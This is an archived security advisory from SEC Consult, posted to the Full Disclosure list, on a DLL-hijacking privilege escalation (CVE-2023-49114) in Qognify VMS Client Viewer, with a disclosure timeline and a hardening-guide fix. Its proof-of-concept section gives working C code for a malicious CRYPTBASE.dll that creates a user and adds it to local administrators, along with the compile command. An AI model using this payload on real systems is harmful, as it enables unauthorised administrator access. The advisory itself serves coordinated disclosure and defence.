---
title: SEC Consult SA-20240226-0 :: Local Privilege Escalation via DLL Hijacking in Qognify VMS Client Viewer
url: https://seclists.org/fulldisclosure/2024/Mar/10
source: Full Disclosure
date: 2024-03-04
fetch_date: 2025-10-04T12:11:31.350502
---

# SEC Consult SA-20240226-0 :: Local Privilege Escalation via DLL Hijacking in Qognify VMS Client Viewer

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](9)
[By Date](date.html#10)
[![Next](/images/right-icon-16x16.png)](11)

[![Previous](/images/left-icon-16x16.png)](9)
[By Thread](index.html#10)
[![Next](/images/right-icon-16x16.png)](11)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20240226-0 :: Local Privilege Escalation via DLL Hijacking in Qognify VMS Client Viewer

---

*From*: "SEC Consult Vulnerability Lab, Research via Fulldisclosure" <fulldisclosure () seclists org>
*Date*: Mon, 26 Feb 2024 11:59:00 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20240226-0 >
=======================================================================
               title: Local Privilege Escalation via DLL Hijacking
             product: Qognify VMS Client Viewer
  vulnerable version: >=7.1
       fixed version: see solution
          CVE number: CVE-2023-49114
              impact: medium
            homepage: https://www.qognify.com/
               found: 2023-11-23
                  by: Sandro Einfeldt (Office Munich)
                      SEC Consult Vulnerability Lab

                      An integrated part of SEC Consult, an Eviden business
                      Europe | Asia

                      https://www.sec-consult.com

=======================================================================

Vendor description:
-------------------
"Qognify, part of Hexagon, helps customers minimize the impact of security,
safety and operational incidents. Qognifyâ€™s comprehensive portfolio of video
management software and enterprise incident management solutions serve
thousands of customers around the world in manufacturing, transportation,
retail, education, finance, logistics, corrections, critical infrastructure
and government."

Source: https://www.qognify.com/about-us/

Business recommendation:
------------------------
The vendor provides a hardening guide for their customers which should be
implemented to ensure that no DLLs can be preloaded.

SEC Consult highly recommends to perform a thorough security review of the product
conducted by security professionals to identify and resolve potential further
security issues.

Vulnerability overview/description:
-----------------------------------
1) Local Privilege Escalation via DLL Hijacking (CVE-2023-49114)
The Qognify VMS Client/Viewer application (VMS_Client.exe) is vulnerable to DLL
Hijacking. The application tries to load multiple DLL files from the DLL search
order without success. At least one of the missing DLL files can be hijacked.
This might allow malicious actors with low privileges on a Windows system to
escalate privileges if some specific pre-conditions are met:

1. The attacker can drop a DLL file in a folder within the DLL search
order (This circumstance is based on a configuration issue in the Windows file
system permissions and is beyond the attacker's control.).
2. A high privileged user starts the VMS_Client.exe FAT client application.

Proof of concept:
-----------------
1) Local Privilege Escalation via DLL Hijacking (CVE-2023-49114)
For successful exploitation, the attacker needs write-access to one of the
following directories in the DLL search order:

1. The directory from which the application loaded
2. The system directory
3. The 16-bit system directory
4. The Windows directory
5. The current working directory (CWD)
6. The directories that are listed in the PATH environment variable

The attacker can use the following malicious C-code to create a POC exploit:

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
     if (dwReason == DLL_PROCESS_ATTACH){
         system("cmd.exe /C net user secconsult P@ssW0rd1sSup3rS6curE /add /Y");
         system("cmd.exe /C net localgroup administrators secconsult /add");
         ExitProcess(0);
     }
     return TRUE;
}

The following command can be used to compile the code and create the DLL file:

x86_64-w64-mingw32-gcc CRYPTBASE.c -shared -o CRYPTBASE.dll

Next, the CRYPTBASE.dll file has to be dropped into one of the previously
mentioned folders of the DLL search order. If a user with local administrative
permissions starts the VMS Client/Viewer FAT client application, CRYPTBASE.dll
gets loaded and the malicious code gets executed with high privileges. In this
POC, the user 'secconsult' is created and added to the group of local
administrators. By following this approach, the attacker is able to escalate
privileges.

Vulnerable / tested versions:
-----------------------------
The following version has been tested which was the latest version available
at the time of the test:
* 7.2

According to the vendor, all versions starting from 7.1 are affected. Users
should implement the hardening guide.

Vendor contact timeline:
------------------------
2024-01-17: Contacting vendor through supportCY () qognify com
2024-01-17: Very quick vendor support response, asking for general information
             about the vulnerability, to be able to assign the correct internal
             team.
2024-01-17: Sending vendor short overview about the vulnerability.
2024-01-17: Vendor support forwards the information internally, we can submit
             the advisory unencrypted to the support email address.
2024-01-17: Submitting advisory.
2024-01-17: Vendor support acknowledges receipt of advisory.
2024-01-22: Responsible person at vendor contacts us, scheduling a meeting.
2024-01-22: Vendor support follows up if responsible person contacted us, closes
             support ticket.
2024-01-23: Meeting with vendor.
2024-02-09: Vendor response with detailed information regarding updated hardening
             guide.
2024-02-13: Follow-up questions regarding hardening guide & availability, affected
             version number, sending new advisory draft.
2024-02-21: Vendor: Sends link to PartnerWeb portal regarding guideline, confirms
             affected versions (>=7.1).
2024-02-22: Updating security advisory with new information, scheduling release
             for 26th February.
2024-02-26: Coordinated release of advisory.

Solution:
---------
The vendor provides a hardening guide for their customers which should be
implemented to ensure that no DLLs can be preloaded.

It can be found in the PartnerWeb portal of Qognify linked from here:
https://www.qognify.com/support-training/guides-documentation/
https://partner.qognify.com/qognify-vms/software-documentation/technical-guides/

Workaround:
-----------
Implement the hardening guide.

Advisory URL:
-------------
https://sec-consult.com/vulnerability-lab/

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Eviden business
Europe | Asia

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
Eviden business. It ensures the continued knowledge gain of SEC Consult in the
field of network and application security to stay ahead of the attacker. The
SEC Consult Vulnerability Lab supports high-quality penetration testing and
the evaluation of new offensive and defensive technologies for our customers.
Hence our customers obtain the most current information about vulnerabilities
and valid recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application https://sec-consult.com/career/

I...